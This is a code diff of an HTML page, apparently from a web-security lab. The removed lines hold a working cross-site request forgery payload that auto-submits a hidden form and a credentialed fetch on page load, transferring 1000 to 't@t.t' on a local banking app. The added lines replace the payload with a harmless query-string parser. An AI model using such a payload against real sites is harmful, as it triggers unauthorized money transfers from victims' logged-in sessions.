@@ -1,43 +1,25 @@
 <html lang="">
 <head>
-    <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
     <title></title>
 </head>
 <body>
-<form action="http://192.168.2.98:49698/transfer" id="transfer" method="POST" name="transfer" enctype="application/x-www-form-urlencoded">
-    <div class="form-row">
-        <div class="form-group col-md-6">
-            <label for="inputTo">To</label>
-            <input class="form-control" id="inputTo" name="user_to" placeholder="Who do you want to transfer to?"
-                   type="text" value="t@t.t">
-        </div>
-        <div class="form-group col-md-6">
-            <label for="inputAmount">Amount</label>
-            <input class="form-control" id="inputAmount" name="amount" placeholder="Amount to transfer" type="number"
-                   value="1000">
-        </div>
-    </div>
-    <input type="submit" value="submit" name="transfer_submit">
-</form>
 <script>
     window.onload = function () {
-        document.forms["transfer"].submit();
-        (async () => {
-            await fetch("http://192.168.2.98:49698/transfer", {
-                "credentials": "include",
-                "headers": {
-                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0",
-                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-                    "Accept-Language": "en-US,en;q=0.5",
-                    "Content-Type": "application/x-www-form-urlencoded",
-                    "Upgrade-Insecure-Requests": "1"
+        let urlParams;
+        (window.onpopstate = function () {
+            let match,
+                pl = /\+/g,  // Regex for replacing addition symbol with a space
+                search = /([^&=]+)=?([^&]*)/g,
+                decode = function (s) {
+                    return decodeURIComponent(s.replace(pl, " "));
                 },
-                "referrer": "http://192.168.2.98:49698/viewtransfer",
-                "body": "user_to=t%40t.t&amount=1000",
-                "method": "POST",
-                "mode": "cors"
-            });
+                query = window.location.search.substring(1);
+
+            urlParams = {};
+            while (match = search.exec(query))
+                urlParams[decode(match[1])] = decode(match[2]);
         })();
+        console.log(urlParams)
     }
 </script>
 </body>
